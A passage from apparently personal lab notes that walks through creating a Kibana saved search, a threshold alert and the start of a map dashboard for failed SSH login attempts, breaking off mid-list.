2. Using the **Available fields** on the left side, add the following fields as columns:
	- `system.auth.ssh.event`
		- Filter for **failed**
		 ![](attachments/Pasted%20image%2020260508113640.png)
	- `user.name`
	- `source.ip`
3. We should now see something like this:
![](attachments/Pasted%20image%2020260508113841.png)
4. We must now save this search by clicking on the **Save** button in the top-right corner
5. Let's name this **Failed SSH Attempts** then click **Save**
![](attachments/Pasted%20image%2020260508114005.png)
6. To create an alert, we can now click on the **Alerts** button on the top-right of the screen, then click **Create search threshold rule**
![](attachments/Pasted%20image%2020260508114117.png)
7. On the **Create rule** page, let's set the following parameters:
	- **IS ABOVE:** 5
		- This will allow this rule to check for failed SSH attempts in the last 5 minutes
	![](attachments/Pasted%20image%2020260508114502.png)
8. Once done, let's click **Next** until we get to where we set our **Rule name**, which I will set as **Failed SSH Attempts**
9. Once done, click on **Create rule**

---

### Creating a Dashboard for Failed SSH Attempts
1. Click on the hamburger menu icon on the top-left and navigate to **Maps**
![](attachments/Pasted%20image%2020260508114757.png)
2. Once on the **Maps** page, let's enter the following query: `system.auth.ssh.event: Failed`
3. Once done, let's click on the **Add layer** button and use the **Choropleth** option
4. Let's set our **EMS boundaries** option as **World Countries**
5. For the **Data view** option, let's set this as `logs-*`
6. 